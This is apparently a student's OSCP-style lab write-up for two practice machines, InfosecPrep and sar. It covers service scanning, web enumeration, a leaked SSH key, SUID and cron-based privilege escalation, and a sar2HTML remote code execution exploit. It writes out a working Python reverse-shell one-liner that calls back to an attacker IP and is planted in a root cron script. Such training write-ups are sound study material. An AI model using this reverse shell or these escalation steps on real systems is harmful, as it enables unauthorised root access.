# InfosecPrep 192.168.239.89

## Service Scanning
In this step i uesed <b> nmap </b>  with option -sV 
``` man
  -sV : Probe open ports to determine service/version info
```
* <b>result :</b>
  
![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.16.10.png)

as shown in the image below I got in result open port 80 running HTTP server and 22 running ssh. now I know that there is a web app on this server I get into the web app and found a website hosted using WordPress and an article on the website. image to the website after reading the article I can see a small hint about the user of this box. now the service scanning step is done we can go to the next step .

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.16.39.png)
 ## Web Enumeration

In this step, I used Directory/File Enumeration using the ffuf tool with a common wordlist.

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.20.09.png)

from ffuf result i can see that there is a robots.txt i check it and found a dissalowed dirctory i check it too and found secrect.txt .

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.22.33.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.23.03.png)

the secret.txt contain encrypted data after I decode it with the base64 tool I got an ssh private key and this is a sensitive data shared publicly I can use it to ssh to the server remotely using `ssh -i option` because I already know the username,
after access to the server now we are in but only as oscp user, we want to go as root so we will check if the is any way to upgrade Privilege to root so this is the next step.

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.25.49.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.26.22.png)

## Privilege Escalation

After access to the machine, we will check how we can do Privilege Escalation, there is a command I used to check if there is  SUID (Set owner User ID up on execution) .

`find / -perm -u=s 2> /dev/null`

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.28.16.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.30.16.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.30.29.png)

as we can see there are some binaries as SUID we can check GTObin how we can use this binary to escalate privilege to root, from the result we can see that bash in the list and from https://gtfobins.github.io/ we can see that bash can escalate privilege using `bash -p`

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.31.00.png)

and finally, we are root.

# sar 192.168.239.89

In this machine, I did all the same steps as the first machine but in the step 
<b>Web Enumeration </b> I didn't find any sensitive data I found only a directory to sar2HTML I check that directory and I got a SAR service running on the server I check if the version of SAR fi it exploit and from https://www.exploit-db.com/exploits/47204 I can see there is a vulnerable I can use it to run shell code execution as a reverse shell what I did first I check ls command and `whoaim` after that I run the server with NC listening in my IP and port I provide and established a connection using a socket with help of python command finally I have a shell from the server I'm now as the www-data user.

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.35.06.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.35.46.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.37.35.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.38.01.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.38.13.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.38.54.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.39.31.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.40.07.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.41.40.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.42.42.png)


## Privilege Escalation

In this machine also checked if there is any binary to use to escalate privilege but unfortunately I did not find any so I checked crontab I found there is a script called finally.sh run every 5 minutes with root permission so find this script location I cat it and got that script called other script called write.sh but write.sh owned by www-data and finnaly.sh with root user so i can use this to make crontab run something for me as root by changing the write.sh so what I did i removed the write.sh from server i and i create new now in my machine with.
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.55.200",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
and run an HTTP server from my machine and download it to the server using `wget` after that i changed permission to make it executable because the finnaly.sh script call write.sh script with ./write needs permission to execute now all I need to wait for 5 minutes waiting for crontab to get the reverse shell with as root.

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.44.19.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.44.47.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.44.56.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.45.10.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.52.00.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.52.47.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.57.14.png)

![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2001.05.16.png)
